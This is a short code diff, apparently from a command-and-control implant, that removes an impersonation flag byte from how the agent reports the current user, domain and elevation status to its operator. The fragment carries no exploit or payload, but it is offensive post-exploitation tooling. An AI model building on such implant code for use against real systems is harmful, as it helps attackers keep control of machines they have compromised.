@@ -350,7 +350,6 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
 
 	if (result) {
-		outPacker->Pack8(FALSE);
 		outPacker->Pack8(elevated);
 		outPacker->PackStringA(domain);
 		outPacker->PackStringA(username);
@@ -998,7 +997,6 @@ void Commander::AlertImpersonated(Packer* outPacker)
 
 			outPacker->Pack32(COMMAND_GETUID);
 
-			outPacker->Pack8(TRUE);
 			outPacker->Pack8(elevated);
 			outPacker->PackStringA(domain);
 			outPacker->PackStringA(username);
